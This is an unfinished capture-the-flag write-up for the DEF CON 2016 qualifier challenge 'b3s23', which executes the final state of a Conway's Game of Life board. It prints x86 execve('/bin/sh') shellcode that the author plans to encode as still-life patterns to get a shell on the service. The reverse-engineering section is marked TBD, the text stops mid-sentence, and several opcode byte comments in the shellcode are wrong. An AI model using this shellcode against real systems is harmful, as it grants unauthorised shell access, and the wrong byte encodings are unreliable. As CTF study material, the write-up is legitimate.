# DEFCON Qualifier 2016: b3s23

----------
## Challenge details
| Contest        | Challenge     | Category  | Points | Solves |
|:---------------|:--------------|:----------|-------:|-------:|
| DEF CON CTF Quals 2016 | b3s23 | Coding Challenges |    111 | 34 |

**Description:**

> Please enjoy a Game of Life at b3s23_28f1ea914f8c873d232da030d4dd00e8.quals.shallweplayaga.me:2323
>
> [Download](http://download.quals.shallweplayaga.me/28f1ea914f8c873d232da030d4dd00e8/b3s23)

-------

## Write-up

### Background

From [Wikipedia](https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life) we learn that b3s23 is the standard way of symbolizing Conway's Game of Life, where a cell is born if it has exactly 3 neighbors, survives if it has 2 or 3 living neighbors, or dies if neither is true. 

### Binary Details

```bash
$ file b3s23
ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
```

### Execution
Upon running the binary we receive the following:
```bash
$ docker run -i legitbs/b3s23
Welcome to b3s23.  Enter x,y coordinates.  Enter any other character to run.
```
It is assumed that we need to enter coordinates in the form x,y (e.g. 1,2) followed by any other character in order to set the positions of the initial live cells on the gameboard and iterate the Game of Life. For example, in order to create a a Block, a [still life](https://en.wikipedia.org/wiki/Still_life_(cellular_automaton)), one could enter the following,
```
0,0
0,1
1,0
1,1
a
```
An excerpt of the output would be
```
110000
110000
000000
```
It was observed from the output that the game was iterating 15 times and then the connnection was closed. The output contained a 110x110 gameboard. I verified that if a coordinate less than 0 or greater than 109 was entered the following error would be printed.
```bash
110,0
Illegal Coordinate!
```
While running it locally, a `Segmentation fault (core dumped)` was reported. The initial assumption was that the result of the final iteration from the Game of Life was being executed by the binary somehow.

### Reverse Engineering

(TBD)

### Solution
To solve this challenge I decided to construct an initial Game of Life board such that the final board would contain assembly code that when executed would provide an interactive shell to the client. I started with the following execve shellcode,

```assembly
xor    %eax,%eax        ; "\x31\xC0"
push   %eax             ; "\x50"
push   $0x68732f2f      ; "\x68\x2F\x2F\x73\x68"
push   $0x6e69622f      ; "\x68\x2F\x62\x69\x6E"
mov    %esp,%ebx        ; "\x89\xDC"
push   %eax             ; "\x50"
push   %ebx             ; "\x53"
mov    %esp,%ecx        ; "\x89\xCC"
mov    $0xb,%al         ; "\xA2\x00\x00\x00\x00"
int    $0x80            ; "\xCD\x80"     
```
This shellcode accomplishes the following,
1. Sets eax to 0 and then pushes the value on the stack to Null-terminate the execution string
2. Pushes the string "/bin/sh" on the stack
3. Moves the address of the string to ebx
4. Pushes eax on the stack again (still 0) in order to Null-terminate the char* array 

I decided to attempt to encode the shellcode using only still life constructions. This would ensure that the entire construction would remain at the end of the 15 iterations. At 22 bytes, the binary encoding of this shellcode would eventually wrap around the 110 bits of the first line of the game board. The issue with wrapping is that it complicates the intial Game of Life construction and most likely would result in destabilizing it. Therefore, I decided to try and reduce the size of the shellcode to only 13 bytes. 

By setting a breakpoint at `0xf661e000`, the address of the game board, I would be able to determine the state of the registers and stack prior to executing the shellcode. The result was the following

``` assembly
eax     0x0
ecx     0x0
edx     0x1
ebx     0xf67c7000    ; last coordinate address
esp     0xf6ffb6cc
eip     0xf661e000
```

Based on those register settings I could 
